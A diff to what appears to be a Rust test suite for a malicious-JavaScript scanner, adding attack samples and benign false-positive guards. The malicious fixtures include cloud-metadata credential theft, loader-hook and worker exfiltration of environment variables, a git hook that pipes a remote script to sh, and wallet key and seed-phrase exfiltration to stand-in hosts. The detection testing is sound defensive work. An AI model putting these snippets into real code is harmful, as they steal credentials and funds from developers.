@@ -186,6 +186,48 @@ fn malicious_corpus() -> Vec<(&'static str, &'static str)> {
             "undici env exfil",
             r#"const {request}=require('undici');request("https://evil.tld/u",{method:"POST",body:JSON.stringify(process.env)});"#,
         ),
+        // --- key theft & anti-analysis (SC-041..SC-049, EV-001) ---
+        // SC-041 is Critical on its own: cloud metadata = IAM credential theft.
+        (
+            "cloud metadata steal",
+            r#"require('https').get("http://169.254.169.254/latest/meta-data/iam/security-credentials/",r=>{let d="";r.on("data",c=>d+=c);r.on("end",()=>fetch("http://evil.tld/?c="+encodeURIComponent(d)))});"#,
+        ),
+        // SC-042 (High) needs corroborating context to BLOCK — a loader hook that
+        // phones home is exactly how the real ones look.
+        (
+            "module loader hook exfil",
+            r#"const Module=require('module');const orig=Module.prototype.require;Module.prototype.require=function(id){if(id==='fs'){fetch("http://evil.tld/x?e="+JSON.stringify(process.env))}return orig.apply(this,arguments)};"#,
+        ),
+        (
+            "data uri code import",
+            r#"import("data:text/javascript;base64,Y29uc29sZS5sb2coMSk=").then(m=>m.run());"#,
+        ),
+        (
+            "worker eval env exfil",
+            r#"const {Worker}=require('worker_threads');new Worker("fetch('http://evil.tld/?d='+JSON.stringify(process.env))",{eval:true});"#,
+        ),
+        (
+            "git hook persistence",
+            r##"require('fs').writeFileSync(".git/hooks/post-checkout","#!/bin/sh\ncurl http://45.61.139.22/x.sh | sh");require('child_process').execSync("chmod +x .git/hooks/post-checkout");"##,
+        ),
+        (
+            "pastebin dead-drop c2",
+            r#"const os=require('os');fetch("https://pastebin.com/raw/xYz9Ab12?h="+os.hostname()+"&e="+encodeURIComponent(JSON.stringify(process.env)));"#,
+        ),
+        (
+            "wallet keypair exfil",
+            r#"const kp=Keypair.fromSecretKey(bs58.decode(s));tx.sign(kp);fetch("https://evil.tld/k",{method:"POST",body:JSON.stringify({PRIVATE_KEY:bs58.encode(kp.secretKey)})});"#,
+        ),
+        (
+            "seed phrase harvest exfil",
+            r#"const w=hdkey.fromMasterSeed(bip39.mnemonicToSeedSync(process.env.MNEMONIC_SECRET));fetch("https://evil.tld/w",{method:"POST",body:JSON.stringify(w.privateKey.toString("hex"))});"#,
+        ),
+        // EV-001 alone is Medium by design; real anti-debug wrappers guard a
+        // decode-and-execute payload, which is what flips the verdict.
+        (
+            "debugger anti-debug trap",
+            r#"setInterval(()=>{debugger;},50);eval(atob("Y29uc29sZS5sb2coMSk="));"#,
+        ),
     ]
 }
 
@@ -333,6 +375,25 @@ fn benign_corpus() -> Vec<(&'static str, &'static str)> {
         (
             "https server reads PORT",
             r#"const https=require('https');const app=require('./app');https.createServer(app).listen(process.env.PORT||443,()=>console.log('up'));"#,
+        ),
+        // FP guard for SC-048/049: legit web3 signing with no exfil sink nearby
+        // must stay clean — bare Keypair.fromSecretKey/signTransaction is every
+        // wallet library.
+        (
+            "solana sign no exfil",
+            r#"const {Keypair,Transaction}=require('@solana/web3.js');const payer=Keypair.fromSecretKey(Uint8Array.from([7,7,7]));const tx=new Transaction();tx.sign(payer);module.exports={tx};"#,
+        ),
+        // FP guard for SC-044/045: worker_threads with a file (not eval:true) is
+        // how jest-worker/piscina/terser run — at most a LOW signal, never flagged.
+        (
+            "worker_threads file worker",
+            r#"const {Worker}=require('worker_threads');const w=new Worker(require.resolve('./heavy-worker.js'));w.once('message',r=>console.log(r));"#,
+        ),
+        // FP guard for SC-046: husky-style hook installation is deliberate and
+        // harmless — Medium at most, never BLOCK/INVESTIGATE.
+        (
+            "husky git hook writer",
+            r#"const fs=require('fs');fs.writeFileSync('.git/hooks/pre-commit','#!/bin/sh\nnpm test\n');fs.chmodSync('.git/hooks/pre-commit',0o755);"#,
         ),
     ]
 }
